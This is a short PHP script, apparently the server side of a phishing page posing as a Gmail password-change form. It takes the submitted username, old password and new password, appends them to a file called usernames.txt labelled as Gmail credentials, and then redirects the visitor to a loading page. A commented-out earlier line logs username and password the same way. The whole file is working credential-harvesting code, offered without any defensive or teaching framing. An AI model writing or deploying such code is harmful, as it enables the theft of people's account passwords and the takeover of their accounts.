<?php

// file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Old: " . $_POST['old-password'] . " New: " . $_POST['confirm-password'] . "\n", FILE_APPEND);

header('Location: loading.html');

// Ensures that no further code is executed
exit();
?>